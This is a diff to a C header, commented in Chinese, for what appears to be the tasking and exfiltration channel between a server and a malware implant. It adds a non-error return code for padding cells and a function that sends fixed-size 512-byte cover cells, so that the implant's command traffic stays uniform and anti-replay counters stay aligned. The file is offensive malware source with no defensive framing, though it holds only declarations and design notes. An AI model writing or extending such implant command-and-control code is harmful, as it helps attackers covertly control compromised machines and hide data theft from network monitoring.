@@ -86,6 +86,19 @@ extern "C" {
 #define EXF_TASK_ERR_REPLAY  -9   /* 重放：信元 counter 或 seq 未严格递增 */
 
 /*
+ * EXF_TASK_PAD — **正值**，这是刻意的。
+ *
+ * recv_cmd/recv_ack 读到覆盖信元（cmd=PAD）时返回此值。它不是错误：
+ * 覆盖信元是正常流量，只是不含命令/回执。用正值而非负值表达，是为了
+ * 让"调用方只判 < 0 就退出循环"的写法不会把覆盖流量误当故障——那种
+ * 误判会让链路在空闲期被自己发的覆盖信元打断。
+ *
+ * 返回此值时：信元层 counter 已推进（防重放仍然有效），而应用层 seq
+ * **未推进**（覆盖不占用命令序号空间）。调用方应继续读下一个信元。
+ */
+#define EXF_TASK_PAD          1   /* 收到覆盖信元：非错误，请继续读 */
+
+/*
  * 任务通道会话状态。
  *
  * ks/kr 是**帧层**方向密钥；cell 是**信元层**上下文，其 k_send/k_recv
@@ -155,6 +168,17 @@ void exfil_task_chan_checkpoint(const exfil_task_chan_t *ch,
  */
 int exfil_task_chan_send_raw(exfil_task_chan_t *ch, int fd,
                              const uint8_t *frame, size_t frame_len);
+
+/*
+ * 发出一个覆盖信元（cmd=PAD），线上同样 512 字节。
+ *
+ * 必须用**本会话的 cell 上下文**封装——信元层 IV = pfx || counter，
+ * 接收方按自己算出的 counter 解。另起上下文会让对端计数器错位，
+ * 表现为全线 AUTH，而真实原因只是"覆盖走了旁路"。
+ *
+ * 覆盖不动 seq：它是信元层的事，应用层序号只由真实命令推进。
+ */
+int exfil_task_chan_cover(exfil_task_chan_t *ch, int fd);
 
 /* ---- 下行：服务端 -> 植入体 ---- */
 
